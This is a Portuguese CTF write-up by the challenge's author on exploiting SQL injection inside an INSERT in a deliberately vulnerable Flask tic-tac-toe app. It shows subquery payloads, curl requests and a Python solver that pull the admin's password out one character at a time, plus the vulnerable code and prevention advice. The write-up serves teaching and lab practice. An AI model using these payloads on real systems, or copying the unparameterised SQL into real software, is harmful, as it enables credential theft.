# Explorando SQL Injection no INSERT - BHack CTF 2022 - Jogo da Velha

Tive o grande prazer de participar do evento de segurança **BHack 2022** e ajudar na organização do CTF, incluindo a elaboração de dois desafios.

Neste write-up, explico o desafio web `Jogo da Velha` e o método proposto de solu.. hacking :)

Pra facilitar a vida de quem estiver começando, serei bastante detalhista em alguns pontos, focando na linha de raciocínio para a solução do desafio.

## O Desafio

![](https://i.imgur.com/uDd0xLr.png)

```
Junte-se a centenas de atletas ao redor do mundo para competir pelo título de melhor jogador do ano na Copa do Mundo de Jogo da Velha!!

A flag é a senha do usuário "admin"
```

Neste desafio, você tem um Jogo da Velha, onde você compete com a "inteligência artificial" do servidor - que é apenas um random, claro :)

![](https://i.imgur.com/Qbjw6aC.png)

Após se registrar e logar, você pode criar novos jogos e jogar contra a máquina, além de listar os jogos já criados e retomar.

## Análise de Código

O código-fonte da aplicação está disponível, permitindo uma análise mais aprofundada do seu comportamento.

### Setup Local (Linux)

Para quem não teve acesso e quiser experimentar, disponibilizei o [código do desafio no github](https://github.com/Neptunians/bhack-ctf-jogo-da-velha).

O código vem com o arquivo [docker-compose.yml](https://github.com/Neptunians/bhack-ctf-jogo-da-velha/blob/main/docker-compose.yml), pra facilitar o setup, principalmente porque temos uma composição de aplicação e banco de dados MySQL.

Por isso, para iniciar o desafio, você precisa ter instaladas as ferramentas abaixo:
- https://docs.docker.com/engine/install/
- https://docs.docker.com/compose/install/compose-plugin/

Com as ferramentas instaladas, você pode entrar na pasta e digitar:

`$ docker compose up`

Obs: o container do banco de dados demora BASTANTE a ser criado na primeira vez (pelo menos uns 5 minutos) e o container da aplicação fica dando erro e reiniciando até que o banco esteja disponível.
Obs: já sei como melhorar esse item, mas não tive tempo de trabalhar nisso antes do CTF.

Exemplo de saída:

```
neptunian:~/safe/bhack-ctf-jogo-da-velha$ docker compose up
[+] Running 2/2
 ⠿ Container bhack-ctf-jogo-da-velha-jogo-da-velha-db-1  Created                                                                         0.5s
 ⠿ Container bhack-ctf-jogo-da-velha-tic-tac-toe-1       Created                                                                         0.3s
Attaching to bhack-ctf-jogo-da-velha-jogo-da-velha-db-1, bhack-ctf-jogo-da-velha-tic-tac-toe-1
bhack-ctf-jogo-da-velha-jogo-da-velha-db-1  | 2022-11-28 23:22:30+00:00 [Note] [Entrypoint]: Entrypoint script for MySQL Server 8.0.29-1.el8 started.
bhack-ctf-jogo-da-velha-jogo-da-velha-db-1  | 2022-11-28 23:22:30+00:00 [Note] [Entrypoint]: Switching to dedicated user 'mysql'
bhack-ctf-jogo-da-velha-jogo-da-velha-db-1  | 2022-11-28 23:22:30+00:00 [Note] [Entrypoint]: Entrypoint script for MySQL Server 8.0.29-1.el8 started.
bhack-ctf-jogo-da-velha-jogo-da-velha-db-1  | 2022-11-28 23:22:30+00:00 [Note] [Entrypoint]: Initializing database files
bhack-ctf-jogo-da-velha-jogo-da-velha-db-1  | 2022-11-28T23:22:30.951563Z 0 [System] [MY-013169] [Server] /usr/sbin/mysqld (mysqld 8.0.29) initializing of server in progress as process 42
bhack-ctf-jogo-da-velha-jogo-da-velha-db-1  | 2022-11-28T23:22:30.983855Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started.
bhack-ctf-jogo-da-velha-tic-tac-toe-1       |  * Serving Flask app 'app' (lazy loading)
bhack-ctf-jogo-da-velha-tic-tac-toe-1       |  * Environment: production
bhack-ctf-jogo-da-velha-tic-tac-toe-1       |    WARNING: This is a development server. Do not use it in a production deployment.
bhack-ctf-jogo-da-velha-tic-tac-toe-1       |    Use a production WSGI server instead.
bhack-ctf-jogo-da-velha-tic-tac-toe-1       |  * Debug mode: off

## erro nas primeiras conexões (mostrando somente as linhas iniciais)

bhack-ctf-jogo-da-velha-tic-tac-toe-1       | Traceback (most recent call last):
bhack-ctf-jogo-da-velha-tic-tac-toe-1       |   File "/home/ttt/.local/lib/python3.10/site-packages/mysql/connector/connection_cext.py", line 263, in _open_connection
bhack-ctf-jogo-da-velha-tic-tac-toe-1       |     self._cmysql.connect(**cnx_kwargs)
bhack-ctf-jogo-da-velha-tic-tac-toe-1       | _mysql_connector.MySQLInterfaceError: Can't connect to MySQL server on 'jogo-da-velha-db:3306' (111)
bhack-ctf-jogo-da-velha-tic-tac-toe-1       | 
bhack-ctf-jogo-da-velha-tic-tac-toe-1       | The above exception was the direct cause of the following exception:
...

## sucesso depois de alguns minutos

bhack-ctf-jogo-da-velha-jogo-da-velha-db-1  | 2022-11-28T23:24:01.432841Z 0 [Warning] [MY-010068] [Server] CA certificate ca.pem is self signed.
bhack-ctf-jogo-da-velha-jogo-da-velha-db-1  | 2022-11-28T23:24:01.432906Z 0 [System] [MY-013602] [Server] Channel mysql_main configured to support TLS. Encrypted connections are now supported for this channel.
bhack-ctf-jogo-da-velha-jogo-da-velha-db-1  | 2022-11-28T23:24:01.619661Z 0 [System] [MY-011323] [Server] X Plugin ready for connections. Bind-address: '::' port: 33060, socket: /var/run/mysqld/mysqlx.sock
bhack-ctf-jogo-da-velha-jogo-da-velha-db-1  | 2022-11-28T23:24:01.619713Z 0 [System] [MY-010931] [Server] /usr/sbin/mysqld: ready for connections. Version: '8.0.29'  socket: '/var/run/mysqld/mysqld.sock'  port: 3306  MySQL Community Server - GPL.
bhack-ctf-jogo-da-velha-tic-tac-toe-1 exited with code 1
bhack-ctf-jogo-da-velha-tic-tac-toe-1       |  * Serving Flask app 'app' (lazy loading)
bhack-ctf-jogo-da-velha-tic-tac-toe-1       |  * Environment: production
bhack-ctf-jogo-da-velha-tic-tac-toe-1       |    WARNING: This is a development server. Do not use it in a production deployment.
bhack-ctf-jogo-da-velha-tic-tac-toe-1       |    Use a production WSGI server instead.
bhack-ctf-jogo-da-velha-tic-tac-toe-1       |  * Debug mode: off
bhack-ctf-jogo-da-velha-tic-tac-toe-1       |  * Running on all addresses (0.0.0.0)
bhack-ctf-jogo-da-velha-tic-tac-toe-1       |    WARNING: This is a development server. Do not use it in a production deployment.
bhack-ctf-jogo-da-velha-tic-tac-toe-1       |  * Running on http://127.0.0.1:5000
bhack-ctf-jogo-da-velha-tic-tac-toe-1       |  * Running on http://172.27.0.3:5000 (Press CTRL+C to quit)
```

Para testar a app funcionando, é só testar no navegador:
`http://localhost:5000/`

Antes de ler o resto do artigo com a solução, sugiro uma tentativa de hackear a aplicação e obter a senha do `admin`.

### Entendendo o Setup

Em uma App com o `docker-compose.yml` disponível, vale dar uma olhada no arquivo pra entender alguns pontos importantes.

```yaml=
version: '3.7'
services:
  jogo-da-velha-db:
    image: mysql:8
    restart: always
    volumes:
      - ./db/schema.sql:/docker-entrypoint-initdb.d/schema.sql:ro
    environment:
      - MYSQL_RANDOM_ROOT_PASSWORD=yes
      - MYSQL_DATABASE=ttt
      - MYSQL_USER=ttt
      - MYSQL_PASSWORD=NAO_DISPONIVEL

  tic-tac-toe:
    build: .
    restart: always
    ports:
      - 5000:5000
    environment:
      - MYSQL_DATABASE=ttt
      - MYSQL_USER=ttt_app
      - MYSQL_PASSWORD=simples
      - MYSQL_HOST=jogo-da-velha-db
    depends_on:
      - jogo-da-velha-db
```

**Resumo**
- A aplicação é composta por dois containers:
    - tic-tac-toe (web app) 
    - jogo-da-velha-db (banco de dados mysql)
- O entrypoint do mysql é o script chamado na inicialização do banco, normalmente pra criar uma estrutura inicial ([schema.sql](https://github.com/Neptunians/bhack-ctf-jogo-da-velha/blob/main/db/schema.sql)).

### Tabelas no Banco de Dados

A investigação do `schema.sql` é interessante para entender como os dados são armazenados, além de trazer uma informação chave.

```sql=
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(32) NOT NULL UNIQUE,
    password  VARCHAR(100) NOT NULL,
    created DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE games (
    id INTEGER PRIMARY KEY AUTO_INCREMENT,
    game_key VARCHAR(36) NOT NULL UNIQUE,
    user_id INTEGER NOT NULL,
    winner CHAR(1) NOT NULL DEFAULT '?', 
    created DATETIME DEFAULT CURRENT_TIMESTAMP,
    CHECK (winner IN ("X", "O", "?", "*"))
);

CREATE TABLE moves (
    game_id INTEGER NOT NULL,
    position INTEGER NOT NULL,
    value CHAR(1) NOT NULL,
    created DATETIME DEFAULT CURRENT_TIMESTAMP,
    CHECK (value IN ("X", "O"))
);

INSERT INTO users (username, password)
VALUES ('admin', 'YmhhY2t7ZmxhZ19wYXJhX3Rlc3Rlc30K');

-- mais linhas abaixo
```

O objetivo, conforme a descrição do desafio, é pegar a senha do usuário `admin`. Após avaliar brevemente o código, você percebe que a senha é armazenada no banco de dados, na tabela `users`, para este usuário.
O formato dessa senha é base64 (não é necessário guess aqui - você vai perceber isso no código da aplicação).

Para verificar a senha de fato:

```bash=
echo YmhhY2t7ZmxhZ19wYXJhX3Rlc3Rlc30K | base64 -d
bhack{flag_para_testes}
```

**Resumo**
- Tabela de usuários (`users`), contendo a senha (e a flag!).
- Tabela de jogos (`games`), vinculados a um usuário.
- Tabela de movimentos (`moves`), vinculados a um jogo, contendo a posição (`position`) e o valor, (`value`), que representa o jogador - `X` ou `O`.
- Os outros campos são menos relevantes para a solução do desafio.


## Buscando falhas

### Análise Inicial

Já sabemos que a flag é a senha do usuário `admin`, codificada como base64 em uma linha da tabela `users`. O próximo passo aqui é dar uma olhada na aplicação e ver como ela interage com o banco pra ver como podemos recuperar a informação.

A aplicação - [app.py](https://github.com/Neptunians/bhack-ctf-jogo-da-velha/blob/main/app.py) - é construída em `Python`, com o uso do framework web `Flask`. Como o código tem **368 linhas**, não vamos passar por cada uma aqui (ufa!).

A maior parte desse código tem um papel mais simples: fazer o jogo da velha funcionar. O foco será nos trechos de código com as vulnerabilidades que vamos explorar.

Algo que chama a atenção logo na primeira olhada é que a aplicação não usa `bind variables` pra passar valores de parâmetros para os comandos SQL. Isso é uma falha grave, que dá pena de morte em alguns países.
Vamos observar, por exemplo, como o processo de login é tratado:

```python=206
@app.route('/login', methods=['GET', 'POST'])
def login():

    user_id, username = getuser()

    if request.method == 'GET':
        if not(user_id is None):
            return redirect(url_for('index'))
        return render_template('login.html', username=username)

    if not(user_id is None):
        return 'Already logged in', 400
        
    username = request.form.get('username')
    password = request.form.get('password')

    try:

        filter_param('username', username)
        filter_param('password', password)

        password = b64encode(bytes(password, 'UTF-8')).decode('UTF-8')

        db, command = getdb()
        command.execute(f'select id from users where username = "{username}" and password = "{password}"')
        result = command.fetchone()

        if result is None:
            return 'Invalid Username or Password', 404

        user_id = result[0]
        if user_id is None:
            return 'Invalid Username or Password', 404

        command.close()

        session['user_id'] = user_id
        session['username'] = username

        return redirect(url_for('index'))
    except mysql.connector.errors.IntegrityError:
        return 'Username already exists!', 400
    except ValueError as valerr:
        return f'DANGER: {valerr}', 400
    except Exception as err:
        traceback.print_exc()
        return 'Internal Error!', 500
```

Na hora de chamar o comando SQL para validar o usuário e senha no banco, ele simplesmente concatena a string, conforme abaixo, colocando os valores entre aspas:

```python=
command.execute(f'select id from users where username = "{username}" and password = "{password}"')
```

Normalmente, isso indica um [SQL Injection](https://portswigger.net/web-security/sql-injection) muito simples, onde o atacante pode enviar aspas no nome de usuário ou senha para injetar comandos SQL.
Obs: não vou explicar o conceito básico de SQL Injection aqui, por ser algo bem conhecido e básico, mas deixo referências.

Apesar da péssima prática, os parâmetros são filtrados em linhas anteriores, pela função `filter_param`.

```python=224
filter_param('username', username)
filter_param('password', password)
```

Vamos entender o que faz essa função:

```python
DANGER_CHARSET = '"\'\\;\n\r\t'
# ... várias linhas depois ...
def filter_param(name, value):
    if not isinstance(value, str):
        raise ValueError(f'Invalid parameter format for "{name}"!')

    for ch in DANGER_CHARSET:
        if ch in value:
            raise ValueError(f'Invalid character in parameter "{name}"!')

    if value.find('--') > 0 or value.find('/*') > 0:
        raise ValueError(f'SQL comment not allowed in parameter "{name}"!')
```

**Resumo**
- Verifica se o parâmetro é, de fato, uma string. Isso reduz o risco de [Type Confusion](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09) - referência em PHP, mas aplicável em alguns casos em Python.
- Verifica se algum caractere enviado faz parte da lista de caracteres perigosos.
- Verifica se existe um comentário de SQL dentro do parâmetro enviado.
- Se qualquer uma dessas condições de risco for encontrada, gera uma exceção

Com isso, EM TEORIA, a aplicação estaria protegida contra SQL Injections. 
Vamos testar a teoria, incluindo aspas no nome do usuário.

![](https://i.imgur.com/UWhIbAG.png)

Ao clicar em `Entrar`, ele gera o erro abaixo, interrompendo o processo de login.

`DANGER: Invalid character in parameter "username"!`

Embora a má prática seja terrível, ela parece estar bem cercada por um super filtro correto? Correto???

### Vulnerabilidade

Com um pouquinho mais de análise, podemos ver um caso de SQL onde a função `filter_param` está sendo executada, mas o SQL não está entre aspas!

```python=106
def insert_move(current_moves, position, player):

    game_id = current_moves['game_id']

    try:
        db, command = getdb()
        command.execute(f'insert into moves (game_id, position, value) values ({game_id}, {position}, "{player}")')
        db.commit()
        command.close()
    except mysql.connector.errors.IntegrityError:
        raise ValueError('Invalid Move! Try Again')
```

**Resumo**
- Esta é a função que insere no banco de dados o movimento informado pelo jogador (ou pela máquina). 
- Dois campos estão no SQL, sem aspas:
    - `game_id`
    - `position`

Analisando o código, verificamos que essa função é chamada na rota `/game/<string:game_key>/move`, que recebe, via POST, o `game_key` ([UUID](https://en.wikipedia.org/wiki/Universally_unique_identifier) do jogo) na URL e a `position` via body do POST.

```python=
@app.route('/game/<string:game_key>/move', methods=['POST'])
def move(game_key):

    user_id, _ = getuser()
    if user_id is None:
        return 'You need to log in first', 400

    param_position = request.form.get('position')

    try:
        filter_param('position', param_position)
        position = param_position
    except ValueError as valerr:
        traceback.print_exc()
        return f'Invalid Position for Move', 400

    try:
        filter_param('game_key', game_key)
        uuid.UUID(game_key, version=4)

    except ValueError:
        return 'Invalid Game Key', 400


    try:
        moves = user_move(game_key, user_id, position)
    except mysql.connector.errors.DatabaseError:
        traceback.print_exc()
        return 'Internal Error!', 500
    except ValueError as valerr:
        return f'{valerr}', 400

    return jsonify(moves)
```

**Resumo**
- Valida a sessão do usuário (irrelevante pra solução)
- Obtém e filtra os parâmetros `position` e `game_key`, via `filter_param`
- Verifica se o valor do parâmetro `game_key` é um UUIDv4 válido.
- Se nenhuma falha for detectada, chama a função `user_move`, com os valores dos parâmetros enviados.

Para terminar de entender o fluxo, é necessário mergulhar mais um nível e entender a função `user_move`:

Obs: só o início da função interessa nesse momento.

```python=119
def user_move(game_key, user_id, position):
    current_moves = get_moves(game_key, user_id)
    game_id = current_moves['game_id']

    if current_moves['winner'] != '?':
        raise ValueError(f'Game is over!')

    # User Move
    insert_move(current_moves, position, 'X')
    
    # ... Resto da função ...
```

Podemos tentar usar o `game_key`, mas como ele precisa ser um UUID válido, não parece haver muito espaço pra exploração aqui.

Por outro lado, o parâmetro `position` é validado apenas para um grupo de caracteres envolvidos que fecham uma string, comentários ou fim de comando SQL, mas ela não valida se o `position` é um número inteiro. Temos um possível SQLi.

### SQL Injection no INSERT

Diferente do tradicional `' or ''='`, esse SQLi está em um INSERT, então ele está gravando o valor em algum local e não retornando os valores diretamente.

Vamos acompanhar esse request no navegador, pra simular o injection. (Usuários de Burp vão fazer isso de forma mais simples, mas vamos no modo artesanal).

Vamos iniciar um novo jogo na App, abrir o Developer Tools do Navegador (F12) e verificar o request enviado quando clicamos na primeira posição (canto superior esquerdo).

Após o clique, é enviado o request abaixo - note que eliminei vários headers irrelevantes para a análise.

```http
POST /game/addb868e-429e-4ef2-b2d1-099ca950a346/move HTTP/1.1
Content-Length: 10
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Host: localhost:5000

position=1
```

O valor `1` para o `position` indica o primeiro movimento do jogo. O SQL gerado fica assim:

```sql
insert into moves
  (game_id, position, value) 
values (1, 1, "X")
```

**Resumo**
- O primeiro valor é o `game_id`, obtido da tabela `games`, que não temos acesso.
- O segundo valor é o `position`, que é justamente o nosso ponto de ataque.
- O último campo é o `player`, que é fixo para os nossos movimentos.

A resposta do request vem no formato JSON:

```json
{
    "O": [8],
    "X": [1],
    "game_id": 1,
    "game_key": "addb868e-429e-4ef2-b2d1-099ca950a346",
    "winner": "?"
}
```

Basicamente é um status do jogo, incluindo os movimentos de "X" (você), os movimentos de "O" (a máquina), o id do jogo, game_key e o vencedor (se houver - neste caso, o jogo ainda não foi finalizado).
Note que o valor `1` que enviamos veio como o primeiro movimento de `X`.

Vamos tentar um próximo passo pra validar que conseguimos gerar um SQL aqui, enviando um valor `1+1` no `position`, de forma que o SQL gerado fique assim:

```sql
insert into moves
  (game_id, position, value) 
values (1, 1+1, "X")
```

Esperamos, claro, que o valor gerado seja `2`.

Enviando com o `curl` - com parâmetros URL Encoded

```bash
curl 'http://localhost:5000/game/8436bd1e-4436-4f41-8ea0-9d39da8d8036/move' \
  -H 'Content-Type: application/x-www-form-urlencoded;charset=UTF-8' \
  -H 'Cookie: session=eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6Im5lcHR1bmlhbjEifQ.Y5MZ8Q.jwVLLcNg7oQKDcVVC6ZC8lMol80' \
  --data-raw 'position=1%2B1'
```

Resposta:

```
invalid literal for int() with base 10: '1+1'
```

Temos um erro aqui!!
Esse é um erro de Python (não de MySQL), que ocorre quando você chama a função `int()` com um valor que não é inteiro - neste caso `1+1`.

Ele está ocorrendo aqui na linha 129, logo após a função `insert_move`, que gera o SQL:

```python=127
insert_move(current_moves, position, 'X')

current_moves['X'].append(int(position))
```

Isso causa a impressão de que o SQL Injection falhou, afinal recebemos um erro, MAS você pode ver que o movimento foi inserido de qualquer forma!

Apesar do retorno com erro nesse request, é possível verificar o status do jogo em outra rota: `game/<game_key>/info`, que é chamada quando você carrega um jogo.

Resposta:

```json
{
    "O": [7],
    "X": [1,2],
    "game_id": 3,
    "game_key": "addb868e-429e-4ef2-b2d1-099ca950a346",
    "winner": "?"
}
```

O player `X` agora tem os movimentos `1` e `2`, conforme o nosso plano diabólico.

Validamos que podemos incluir uma expressão. Podemos incluir um SQL? O importante é não incluir nenhum dos caracteres bloqueados (aspas, etc..).

Vamos testar a posição 3, mas agora usando uma subquery, com o payload:

```
position=(select 2+1)
```

Isso gera o SQL abaixo:

```sql
insert into moves
  (game_id, position, value) 
values (1, (select 2+1), "X")
```

Bora pra luta:

```bash
curl 'http://localhost:5000/game/8436bd1e-4436-4f41-8ea0-9d39da8d8036/move' \
  -H 'Content-Type: application/x-www-form-urlencoded;charset=UTF-8' \
  -H 'Cookie: session=eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6Im5lcHR1bmlhbjEifQ.Y5MZ8Q.jwVLLcNg7oQKDcVVC6ZC8lMol80' \
  --data-raw 'position=(select%202%2B1)'
```

Recebemos a mesma resposta com erro Python, mas o `/info` retorna:

```json
{
    "O": [7],
    "X": [1,2,3],
    "game_id": 3,
    "game_key": "addb868e-429e-4ef2-b2d1-099ca950a346",
    "winner": "?"
}
```

O `X` agora inclui o valor `3`, resultado da subquery que inserimos. Ataque comprovado, ou seu dinheiro de volta.

## Hacktion Plan

Temos um SQL injection, mas ainda precisamos extrair a flag, que é a senha do Admin, codificada em base64.

Aqui temos uma limitação: só conseguimos inserir um valor inteiro, já que o campo `POSITION`, da tabela `moves`, é do tipo `INTEGER`.

Nada que seja um problema, afinal podemos inserir várias linhas e representar qualquer informação digital como uma sequência de números ;)

Neste caso, podemos gravar o código de cada caractere da senha como um novo `POSITION`. Em teoria, isso deveria ser um problema (posições já ocupadas), mas não tem uma `constraint` no banco impedindo isso, então... tá pa noiz.

Vamos testar essa hipótese, injetando uma subquery que insere o código ASCII do primeiro caractere da senha do `admin`. Como o `admin` é o primeiro a ser incluído, o ID do usuário dele é `1`.

```
position=(select ord(substring(password, 1, 1)) from users where id = 1)
```

Obs: Dá pra buscar o usuário admin também pelo nome, mas aí você precisa fazer um bypass no bloqueio de aspas. Deixo como exercício.

O SQL gerado fica assim:

```sql
insert into moves
  (game_id, position, value) 
values (1, (select ord(substring(password, 1, 1)) from users where id = 1), "X")
```

Partiu `curl`:

```bash
curl 'http://localhost:5000/game/8436bd1e-4436-4f41-8ea0-9d39da8d8036/move' \
  -H 'Content-Type: application/x-www-form-urlencoded;charset=UTF-8' \
  -H 'Cookie: session=eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6Im5lcHR1bmlhbjEifQ.Y5MZ8Q.jwVLLcNg7oQKDcVVC6ZC8lMol80' \
  --data-raw 'position=(select%20ord(substring(password%2C%201%2C%201))%20from%20users%20where%20id%20%3D%201)'
```

Retorno do `/info`:

```json
{
    "O": [7],
    "X": [1,2,3,89],
    "game_id": 3,
    "game_key": "addb868e-429e-4ef2-b2d1-099ca950a346",
    "winner": "?"
}
```

O número `89` é o ASCII da letra `Y`. Veja que o `Y` é a primeira letra do base64 do nosso ambiente simulado `YmhhY2t7ZmxhZ19wYXJhX3Rlc3Rlc30K`.

Agora só temos que fazer isso pra cada caractere da senha. Mas pra isso, precisamos primeiro pegar o tamanho da senha, o que já está facinho.

Vamos direto pra subquery:

```sql
(select length(password) from users where id = 1)
```

Retorno:

```json
{
    "O": [7],
    "X": [1,2,3,89,32],
    "game_id": 3,
    "game_key": "addb868e-429e-4ef2-b2d1-099ca950a346",
    "winner": "?"
}
```

O último valor retornado é `32`, que é exatamente o tamanho da senha.

Com isso, o plano de ação fica assim:
1. Injetar uma subquery pra pegar o tamanho da senha do `admin`
2. Pegar esse resultado na rota `/game/<game_key>/info`
3. Fazer um loop que vai de 1 ao tamanho da senha (obtido no passo 2) - ignorar os erros.
4. Buscar os valores da rota `/game/<game_key>/info`
5. Extrair os valores do JSON dentro do atributo `X` (mantendo a ordem).
6. Gerar o caractere ASCII de cada número 
7. Juntar todos os caracteres, na ordem.
8. Fazer o decode do base64

Bora exploitar.

## Exploit

Pra facilitar a rodada do exploit, vale começar o processo do zero, registrando um novo usuário e criando um novo jogo pra fazer esses passos, a estrutura básica fica assim:

```python=89
def crackit():
    register()
    login()
    game_key = newgame()
    enc_pwd = get_encoded_password(game_key)
    pwd = base64.b64decode(enc_pwd)

    print(pwd)
```

Não vou explicar cada passo aqui, que o negócio já tá virando bíblia.
A função `get_encoded_password` mostra a estrutura do nosso plano de ação:

```python=89
def get_encoded_password(game_key):
    size = insert_pwd_size(game_key)
    encoded = brute_pwd(game_key, size)

    result_str = ''
    for code in encoded[1:]:
        result_str += chr(code)

    return result_str
```

Pegamos primeiro o tamanho da senha com a função `insert_pwd_size`:

```python=64
def insert_pwd_size(game_key):
    data = {
        'position': f'(select length(password) from users where id = 1)',
    }

    request(f'/game/{game_key}/move', data=data)

    return int(get_my_moves(game_key)[0])
```

Depois inserimos o código de caractere por caractere com as funções `brute_pwd` e `insert_pwd_pos` (ignorando a saída):

```python=57
def insert_pwd_pos(game_key, pwd_position):
    data = {
        'position': f'(select ord(substring(password, {pwd_position+1}, 1)) from users where id = 1)',
    }

    return request(f'/game/{game_key}/move', data=data)
```

```python=73
def brute_pwd(game_key, size):
    for pos in range(size):
        insert_pwd_pos(game_key, pos)

    return get_my_moves(game_key)
```

Depois de tudo inserido às cegas, mas com esperança, pegamos o resultado com a função `get_my_moves`.

```python=73
def get_my_moves(game_key):
    response = request(f'/game/{game_key}/info', data=None, method='GET')
    return response.json()['X']
```

A partir daí, já temos o nosso resultado em base64 pra decodificar. Bora rodar essa praga.
Obs: o código do [solver.py](https://github.com/Neptunians/bhack-ctf-jogo-da-velha/blob/main/solver.py) aponta para `http://localhost:5000`, que é o endereço ambiente local, definido no `docker-compose.yml`.

Obs: vou resumir as linhas aqui porque a saída é grande.

```
$ python solver.py 
==> REQUEST to http://localhost:5000/register
{'username': 'neptunianxxx715', 'password': 'neptunianpwdxxx715'}

RESPONSE: 200
# ... um monte de linhas

==> REQUEST to http://localhost:5000/newgame
{'None': 0}

RESPONSE: 200
{"game_key":"87228aac-decc-4911-be31-05c05aa78ca5"}

==> REQUEST to http://localhost:5000/game/87228aac-decc-4911-be31-05c05aa78ca5/move
{'position': '(select length(password) from users where id = 1)'}

RESPONSE: 400
invalid literal for int() with base 10: '(select length(password) from users where id = 1)'
==> REQUEST to http://localhost:5000/game/87228aac-decc-4911-be31-05c05aa78ca5/info
None

RESPONSE: 200
{"O":[],"X":[32],"game_id":7,"game_key":"87228aac-decc-4911-be31-05c05aa78ca5","winner":"?"}

==> REQUEST to http://localhost:5000/game/87228aac-decc-4911-be31-05c05aa78ca5/move
{'position': '(select ord(substring(password, 1, 1)) from users where id = 1)'}

==> REQUEST to http://localhost:5000/game/87228aac-decc-4911-be31-05c05aa78ca5/move
{'position': '(select ord(substring(password, 1, 1)) from users where id = 1)'}

RESPONSE: 400
invalid literal for int() with base 10: '(select ord(substring(password, 1, 1)) from users where id = 1)'
==> REQUEST to http://localhost:5000/game/87228aac-decc-4911-be31-05c05aa78ca5/move
{'position': '(select ord(substring(password, 2, 1)) from users where id = 1)'}

RESPONSE: 400
invalid literal for int() with base 10: '(select ord(substring(password, 2, 1)) from users where id = 1)'

# ... mais um bocadão de linhas

==> REQUEST to http://localhost:5000/game/87228aac-decc-4911-be31-05c05aa78ca5/info
None

RESPONSE: 200
{"O":[],"X":[32,89,109,104,104,89,50,116,55,90,109,120,104,90,49,57,119,89,88,74,104,88,51,82,108,99,51,82,108,99,51,48,75],"game_id":7,"game_key":"87228aac-decc-4911-be31-05c05aa78ca5","winner":"?"}

b'bhack{flag_para_testes}\n'
```

Pegamos a nossa flag (de testes locais)!!

Se você rodasse esse script, no dia do desafio, teria a flag para pontuar:

`bhack{$qL1_m4njad0_M@$_d1v3rtE_749db6dd8b4a74a349a8a14a12b43d3f113fea67}`

O código final completo do exploit, você encontra aqui: [solver.py](https://github.com/Neptunians/bhack-ctf-jogo-da-velha/blob/main/solver.py).


## A Experiência

### Engajamento

Foi extremamente interessante acompanhar o engajamento durante o CTF, porque ele acabou gerando bastante interesse de alguns times.

Infelizmente, em determinada situação, passamos a tomar erros, que geraram instabilidade no desafio:

`MySQL Connection not available`

Esse erro ocorre por algum problema relacionado ao pool de conexões que usamos nesse caso para o MySQL, o `mysql.connector`. 
Demos uma olhada mais geral no tema, mas ainda não conseguimos fôlego pra investigar com calma.
Mas é uma lição aprendida para próximos CTFs.

Por conta disso, foi necessário reiniciar o desafio várias vezes.

Ainda assim, foi uma excelente experência e fiquei com a impressão de que os times se divertiram e aprenderam bastante no processo.

### Solução Alternativa

O desafio teve uma solução e foi resolvido pelo time que ficou em primeiro lugar no CTF, o `Cinquenta Tons de Vermelho`.

Não consegui ver os detalhes da solução com o time infelizmente, mas sei que foi um timing attack, com o uso da função `sleep` no MySQL.

Não previ isso e curti demais :)

O único porém é que essa solução demandou um volume de requisições muito maior, porque foi preciso fazer brute em cada caractere, gastando mais tempo dos jogadores.

O timing attack também tem alguns riscos de precisão, fazendo com que o time tivesse que reexecutar o payload algumas vezes, pra revisitar caracteres que falharam.

Isso também acabou potencializando o bug do desafio, gerando mais necessidade de restarts.

De qualquer forma, isso tem mais a ver com a arquitetura do desafio em si. A solução do time foi bastante inteligente e criativa.

Valeu demais!

![](https://i.imgur.com/kYZCPSF.jpeg)

**Foto**: [Artigo do Mente Binária](https://www.mentebinaria.com.br/noticias/portal-mente-bin%C3%A1ria/bhack-o-ctf-garantiu-uma-emo%C3%A7%C3%A3o-a-mais-ao-evento-r656/)

### Jogo da Velha no Multiverso da Loucura

Fiquei na dúvida no início se fazia o desafio um pouco mais difícil. 
Atualmente ele permite inserir quaisquer valores no campo `position`, mas um fator dificultador seria restringir, em forma de constraint no banco de dados, apenas valores de 1 a 9. Uma outra restrição seria impedir valores repetidos em um jogo.

Isso tornaria necessário um brute-force char-by-char, via boolean-based search, abrindo vários jogos diferentes também (seria possível otimizar, mas dessa forma seria suficiente).

Outra abordagem seria um SQL Injection via username, criando uma sessão fake, através de um brute-force da `secret key` do Flask.
Só que isso seria achismo demais:
- Adivinhar que a secret key do Flask
- Ter uma wordlist com a senha correta (mesmo uma fácil)
  
Foi melhor abortar.

Exemplo de código vulnerável (user_id sem filtro):

```python=73
command.execute(f'select id, winner from games where game_key = "{game_key}" and user_id = {user_id}')
```

## Prevenção

- Ao criar uma aplicação utilizando SQL diretamente, por favor, utilize `bind variables` pra passar os valores ao invés de concatenção de strings.
- Faça isso mesmo que você acredite que o dado de entrada vem de uma fonte segura (ao exemplo do user_id do desafio). Embora ele seja relativamente seguro, seria possível injetar SQL se você descobrir a secret key.
- Use encriptação pra armazenar dados sensíveis. Base64 é uma codificação simples, mas não é encriptação. Não traz nenhuma proteção.
- Use uma solução mais apropriada para o gerenciamento de usuários: você tem diversas soluções de autenticação mais provadas em batalha do que "a tabela `USERS`".


## Referências
* [Repositório Github com os códigos discutidos](https://github.com/Neptunians/bhack-ctf-jogo-da-velha)
* [SQL Injection](https://portswigger.net/web-security/sql-injection)
* [MySQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection/mysql-injection)
* [SQL Injection - Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
* [UUID](https://en.wikipedia.org/wiki/Universally_unique_identifier)
* [Artigo do Mente Binária sobre o CTF](https://www.mentebinaria.com.br/noticias/portal-mente-bin%C3%A1ria/bhack-o-ctf-garantiu-uma-emo%C3%A7%C3%A3o-a-mais-ao-evento-r656/)
* Time: [FireShell](https://fireshellsecurity.team/)
* Twitter: [@fireshellst](https://twitter.com/fireshellst)
* Me siga também :) [@NeptunianHacks](https://twitter.com/NeptunianHacks) 